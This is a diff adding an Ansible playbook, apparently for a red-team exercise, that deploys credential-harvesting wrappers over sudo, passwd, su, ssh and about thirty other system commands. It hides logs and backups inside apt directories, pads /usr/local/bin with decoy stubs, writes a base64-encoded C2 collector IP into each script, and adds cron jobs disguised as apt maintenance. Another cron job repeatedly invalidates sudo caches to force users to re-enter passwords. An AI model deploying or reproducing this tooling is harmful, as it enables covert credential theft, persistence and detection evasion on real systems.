@@ -1,0 +1,291 @@
+---
+# Chum Bucket Red Team — Wrapper Deploy Playbook
+# Deploys PATH-hijack wrappers, bonsly watcher, and apt-daily-check cron.
+#
+# Prerequisites on deploy box:
+#   pip install ansible --break-system-packages
+#
+# Usage:
+#   ansible-playbook deploy_wrappers.yml -i inventory.ini
+#
+# Set c2_ip before running.
+
+- name: Deploy credential wrappers to Linux hosts
+  hosts: linux_targets
+  become: yes
+  gather_facts: no
+
+  vars:
+    # -------------------------------------------------------
+    # MUST SET BEFORE DEPLOY — set c2_ip in inventory.ini:
+    #   [linux_targets:vars]
+    #   c2_ip=x.x.x.x
+    # Or pass on CLI: -e "c2_ip=x.x.x.x"
+    # -------------------------------------------------------
+
+    # Wrapper install path (must be before /usr/bin in PATH)
+    wrapper_bin:  "/usr/local/bin"
+
+    # Wrapper source dir on deploy box (relative to playbook)
+    wrapper_src:  "wrappers"
+
+    # Log dir on targets
+    log_dir:      "/var/lib/apt/lists/.cache"
+
+    # Hidden backup dir (inside apt methods tree — looks like apt internals)
+    backup_dir:   "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
+
+  tasks:
+
+    # -------------------------------------------------------
+    # 0. Dependencies
+    # -------------------------------------------------------
+    - name: Install required packages
+      apt:
+        name:
+          - curl
+          - expect
+          - binutils
+        state: present
+        update_cache: yes
+
+    # -------------------------------------------------------
+    # 1. Persistent PATH override
+    #    /usr/local/bin prepended so our wrappers shadow real bins.
+    #    Takes effect on next login.
+    # -------------------------------------------------------
+    - name: Ensure /usr/local/bin is first in /etc/environment PATH
+      lineinfile:
+        path: /etc/environment
+        regexp: "^PATH="
+        line: 'PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"'
+        create: yes
+
+    # -------------------------------------------------------
+    # 2. Create hidden log directory
+    # -------------------------------------------------------
+    - name: Create wrapper log dir and events file with correct permissions
+      shell: |
+        mkdir -p "{{ log_dir }}"
+        chmod 0777 "{{ log_dir }}"
+        touch "{{ log_dir }}/events"
+        chmod 0777 "{{ log_dir }}/events"
+      args:
+        executable: /bin/bash
+
+    # -------------------------------------------------------
+    # 3. Deploy all wrappers
+    # -------------------------------------------------------
+    - name: Copy all wrappers to target
+      copy:
+        src: "{{ wrapper_src }}/{{ item.src }}"
+        dest: "{{ wrapper_bin }}/{{ item.dest }}"
+        owner: root
+        group: root
+        mode: "0755"
+      loop:
+        - { src: "sudo_wrapper.sh",       dest: "sudo"       }
+        - { src: "passwd_wrapper.sh",     dest: "passwd"     }
+        - { src: "su_wrapper.sh",         dest: "su"         }
+        - { src: "ssh_wrapper.sh",        dest: "ssh"        }
+        - { src: "useradd_wrapper.sh",    dest: "useradd"    }
+        - { src: "userdel_wrapper.sh",    dest: "userdel"    }
+        - { src: "deluser_wrapper.sh",    dest: "deluser"    }
+        - { src: "usermod_wrapper.sh",    dest: "usermod"    }
+        - { src: "visudo_wrapper.sh",     dest: "visudo"     }
+        - { src: "systemctl_wrapper.sh",  dest: "systemctl"  }
+        - { src: "ufw_wrapper.sh",        dest: "ufw"        }
+        - { src: "iptables_wrapper.sh",   dest: "iptables"   }
+        - { src: "iptables_wrapper.sh",   dest: "ip6tables"  }
+        - { src: "adduser_wrapper.sh",    dest: "adduser"    }
+        - { src: "rm_wrapper.sh",         dest: "rm"         }
+        - { src: "ls_wrapper.sh",         dest: "ls"         }
+        - { src: "find_wrapper.sh",       dest: "find"       }
+        - { src: "ps_wrapper.sh",         dest: "ps"         }
+        - { src: "kill_wrapper.sh",       dest: "kill"       }
+        - { src: "pkill_wrapper.sh",      dest: "pkill"      }
+        - { src: "killall_wrapper.sh",    dest: "killall"    }
+        - { src: "grep_wrapper.sh",       dest: "grep"       }
+        - { src: "stat_wrapper.sh",       dest: "stat"       }
+        - { src: "chmod_wrapper.sh",      dest: "chmod"      }
+        - { src: "chown_wrapper.sh",      dest: "chown"      }
+        - { src: "mv_wrapper.sh",         dest: "mv"         }
+        - { src: "cp_wrapper.sh",         dest: "cp"         }
+        - { src: "which_wrapper.sh",      dest: "which"      }
+        - { src: "cat_wrapper.sh",        dest: "cat"        }
+        - { src: "less_wrapper.sh",       dest: "less"       }
+        - { src: "more_wrapper.sh",       dest: "more"       }
+        - { src: "file_wrapper.sh",       dest: "file"       }
+        - { src: "strings_wrapper.sh",    dest: "strings"    }
+        - { src: "diff_wrapper.sh",       dest: "diff"       }
+        - { src: "md5sum_wrapper.sh",     dest: "md5sum"     }
+        - { src: "sha256sum_wrapper.sh",       dest: "sha256sum"       }
+        - { src: "iptables-save_wrapper.sh",   dest: "iptables-save"   }
+        - { src: "iptables-save_wrapper.sh",   dest: "ip6tables-save"  }
+
+    - name: Base64-encode collector IP and replace __ENC__ placeholder in all wrappers
+      shell: |
+        _E=$(printf "%s" "{{ c2_ip }}" | base64 -w0)
+        for f in sudo passwd su ssh useradd userdel deluser usermod visudo systemctl ufw iptables ip6tables adduser rm ls find ps kill pkill killall grep stat chmod chown mv cp which cat less more file strings diff md5sum sha256sum iptables-save ip6tables-save; do
+          sed -i "s/__ENC__/${_E}/g" "{{ wrapper_bin }}/${f}"
+        done
+      args:
+        executable: /bin/bash
+
+    # -------------------------------------------------------
+    # 4. Pad /usr/local/bin with passthrough stubs
+    #    Makes the directory look like a normal fully-populated
+    #    local bin rather than a handful of suspicious files.
+    # -------------------------------------------------------
+    - name: Populate /usr/local/bin with passthrough stubs
+      shell: |
+        for bin in /usr/bin/* /usr/sbin/*; do
+            name=$(basename "$bin")
+            dest="/usr/local/bin/$name"
+            [ -f "$dest" ] && continue
+            [ -x "$bin" ] || continue
+            # Skip .sh files — they are meant to be sourced, not executed
+            # Wrapping them breaks session startup scripts (e.g. gettext.sh)
+            [[ "$name" == *.sh ]] && continue
+            real=$(readlink -f "$bin")
+            [[ "$real" == /usr/local/bin/* ]] && continue
+            printf '#!/bin/bash\nexec "%s" "$@"\n' "$bin" > "$dest"
+            chmod 755 "$dest"
+        done
+      args:
+        executable: /bin/bash
+
+    # -------------------------------------------------------
+    # 5. Sudo cache invalidation cron
+    #    Forces password re-entry on next sudo every 5 minutes.
+    # -------------------------------------------------------
+    - name: Install sudo cache invalidation cron
+      copy:
+        dest: /etc/cron.d/sudo-cache-clear
+        content: |
+          # Invalidate sudo timestamp cache for all non-system users
+          */5 * * * * root for u in $(awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd); do sudo -k -u $u 2>/dev/null; done
+        mode: "0644"
+
+    # -------------------------------------------------------
+    # 6. Hidden wrapper backup directory
+    #    Inside the apt methods tree — blends with real apt internals.
+    #    mode 700 so only root can list it.
+    # -------------------------------------------------------
+    - name: Create hidden wrapper backup directory
+      file:
+        path: "{{ backup_dir }}"
+        state: directory
+        owner: root
+        group: root
+        mode: "0700"
+
+    - name: Copy wrapper sources to hidden backup dir (keep __ENC__ placeholder)
+      copy:
+        src: "{{ wrapper_src }}/{{ item }}"
+        dest: "{{ backup_dir }}/{{ item }}"
+        owner: root
+        group: root
+        mode: "0600"
+      loop:
+        - sudo_wrapper.sh
+        - passwd_wrapper.sh
+        - su_wrapper.sh
+        - ssh_wrapper.sh
+        - useradd_wrapper.sh
+        - adduser_wrapper.sh
+        - userdel_wrapper.sh
+        - deluser_wrapper.sh
+        - usermod_wrapper.sh
+        - visudo_wrapper.sh
+        - systemctl_wrapper.sh
+        - ufw_wrapper.sh
+        - iptables_wrapper.sh
+        - rm_wrapper.sh
+        - ls_wrapper.sh
+        - find_wrapper.sh
+        - ps_wrapper.sh
+        - kill_wrapper.sh
+        - pkill_wrapper.sh
+        - killall_wrapper.sh
+        - grep_wrapper.sh
+        - stat_wrapper.sh
+        - chmod_wrapper.sh
+        - chown_wrapper.sh
+        - mv_wrapper.sh
+        - cp_wrapper.sh
+        - which_wrapper.sh
+        - cat_wrapper.sh
+        - less_wrapper.sh
+        - more_wrapper.sh
+        - file_wrapper.sh
+        - strings_wrapper.sh
+        - diff_wrapper.sh
+        - md5sum_wrapper.sh
+        - sha256sum_wrapper.sh
+        - iptables-save_wrapper.sh
+
+    # -------------------------------------------------------
+    # 7. Deploy Bonsly (wrapper watcher + firewall enforcer)
+    # -------------------------------------------------------
+    - name: Copy bonsly to target
+      copy:
+        src: "{{ wrapper_src }}/bonsly.sh"
+        dest: "{{ log_dir }}/bonsly.sh"
+        owner: root
+        group: root
+        mode: "0700"
+
+    - name: Base64-encode collector IP and replace __ENC__ in bonsly
+      shell: |
+        _E=$(printf "%s" "{{ c2_ip }}" | base64 -w0)
+        sed -i "s/__ENC__/${_E}/g" {{ log_dir }}/bonsly.sh
+      args:
+        executable: /bin/bash
+
+    - name: Kill any existing bonsly
+      shell: pkill -f "bonsly.sh" || true
+      args:
+        executable: /bin/bash
+      ignore_errors: yes
+
+    - name: Start bonsly in background
+      shell: "{{ log_dir }}/bonsly.sh '{{ c2_ip }}' '{{ backup_dir }}' >> {{ log_dir }}/sync.log 2>&1"
+      args:
+        executable: /bin/bash
+      async: 86400
+      poll: 0
+
+    # -------------------------------------------------------
+    # 8. apt-daily-check cron
+    #    Every 5 min: restart bonsly if file exists, else
+    #    report watcher_down to collector.
+    # -------------------------------------------------------
+    - name: Copy apt-daily-check script
+      copy:
+        src: "{{ wrapper_src }}/apt-daily-check"
+        dest: "/usr/local/sbin/apt-daily-check"
+        owner: root
+        group: root
+        mode: "0700"
+
+    - name: Base64-encode collector IP and replace __ENC__ in apt-daily-check
+      shell: |
+        _E=$(printf "%s" "{{ c2_ip }}" | base64 -w0)
+        sed -i "s/__ENC__/${_E}/g" /usr/local/sbin/apt-daily-check
+      args:
+        executable: /bin/bash
+
+    - name: Install apt-daily-check cron
+      copy:
+        dest: /etc/cron.d/apt-daily-check
+        content: |
+          */5 * * * * root /usr/local/sbin/apt-daily-check
+        mode: "0644"
+
+    # -------------------------------------------------------
+    # 9. Reboot to apply PATH from /etc/environment
+    # -------------------------------------------------------
+    - name: Reboot to apply environment changes
+      reboot:
+        reboot_timeout: 120
